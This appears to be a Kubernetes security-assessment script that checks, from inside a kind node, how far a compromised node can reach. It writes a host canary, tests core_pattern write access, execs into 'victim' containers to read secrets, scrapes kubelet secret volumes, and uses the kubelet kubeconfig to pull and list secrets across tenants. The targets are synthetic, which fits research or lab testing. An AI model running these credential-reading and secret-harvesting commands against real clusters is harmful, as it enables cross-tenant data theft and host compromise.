#!/usr/bin/env bash
set -uo pipefail

mode="${1:-unknown}"
runtime_endpoint="unix:///run/containerd/containerd.sock"

sanitize() {
  tr '\t\r\n' '   ' | sed -E 's/[[:space:]]+/ /g' | cut -c1-240
}

emit_command() {
  local category="$1"
  local probe="$2"
  shift 2
  local output rc status
  output="$("$@" 2>&1)"
  rc=$?
  if [[ "$rc" -eq 0 ]]; then
    status="ALLOWED"
  elif [[ "$rc" -eq 126 || "$rc" -eq 127 ]]; then
    status="ERROR"
  else
    status="DENIED"
  fi
  printf '%s\t%s\t%s\t%s\n' "$category" "$probe" "$status" "$(printf '%s' "$output" | sanitize)"
}

emit_value() {
  local category="$1"
  local probe="$2"
  local status="$3"
  local detail="$4"
  printf '%s\t%s\t%s\t%s\n' "$category" "$probe" "$status" "$(printf '%s' "$detail" | sanitize)"
}

echo -e "category\tprobe\tstatus\tdetail"
emit_value META mode INFO "$mode"
emit_value META node_kernel INFO "$(uname -srmo)"
emit_value META node_identity INFO "$(id)"

emit_command HOST host_root_canary_write sh -c \
  'printf "probe-%s\n" "$(date +%s)" >> /poc-host/root-owned-canary'
emit_command HOST kernel_core_pattern_writable test -w /proc/sys/kernel/core_pattern
emit_command HOST host_root_only_file_read sh -c 'cat /poc-host/root-only-synthetic'

if ! command -v crictl >/dev/null 2>&1; then
  emit_value RUNTIME crictl_present ERROR "crictl not found in kind node"
else
  emit_command RUNTIME containerd_socket_writable test -w /run/containerd/containerd.sock
  emit_command RUNTIME cri_list_containers crictl --runtime-endpoint "$runtime_endpoint" ps

  for victim in victim-a victim-b; do
    pod_id="$(crictl --runtime-endpoint "$runtime_endpoint" pods --name "$victim" -q 2>/dev/null | head -n1)"
    container_id=""
    if [[ -n "$pod_id" ]]; then
      container_id="$(crictl --runtime-endpoint "$runtime_endpoint" ps --pod "$pod_id" -q 2>/dev/null | head -n1)"
    fi
    if [[ -z "$container_id" ]]; then
      emit_value WORKLOAD "cri_exec_${victim}_secret" ERROR "victim container not found"
    else
      emit_command WORKLOAD "cri_exec_${victim}_secret" \
        crictl --runtime-endpoint "$runtime_endpoint" exec "$container_id" \
        sh -c 'cat /synthetic-secret/value'
    fi
  done
fi

emit_command WORKLOAD kubelet_secret_volume_files_read sh -c \
  'files="$(find /var/lib/kubelet/pods -path "*/volumes/kubernetes.io~secret/*/value" -type f)"; test -n "$files"; for file in $files; do printf "%s=" "$file"; cat "$file"; done'
emit_command KUBELET kubelet_client_key_read test -r /var/lib/kubelet/pki/kubelet-client-current.pem

if ! command -v kubectl >/dev/null 2>&1; then
  emit_value KUBELET kubectl_present ERROR "kubectl not found in kind node"
elif [[ ! -r /etc/kubernetes/kubelet.conf ]]; then
  emit_value KUBELET kubelet_kubeconfig_read ERROR "/etc/kubernetes/kubelet.conf not readable"
else
  emit_command KUBELET kubelet_get_referenced_alpha_secret \
    bash -o pipefail -c \
    "kubectl --kubeconfig /etc/kubernetes/kubelet.conf -n tenant-a get secret alpha-secret -o 'jsonpath={.data.value}' | base64 -d"
  emit_command KUBELET kubelet_get_referenced_beta_secret \
    bash -o pipefail -c \
    "kubectl --kubeconfig /etc/kubernetes/kubelet.conf -n tenant-b get secret beta-secret -o 'jsonpath={.data.value}' | base64 -d"
  emit_command KUBELET kubelet_get_unreferenced_orphan_secret \
    bash -o pipefail -c \
    "kubectl --kubeconfig /etc/kubernetes/kubelet.conf -n tenant-a get secret orphan-secret -o 'jsonpath={.data.value}' | base64 -d"
  emit_command KUBELET kubelet_list_all_secrets \
    kubectl --kubeconfig /etc/kubernetes/kubelet.conf get secrets -A
fi

# A single-node kind control plane normally contains admin.conf. It is recorded
# only to expose the confounder and MUST NOT be used as worker-node evidence.
emit_command CONFOUNDER control_plane_admin_kubeconfig_read test -r /etc/kubernetes/admin.conf
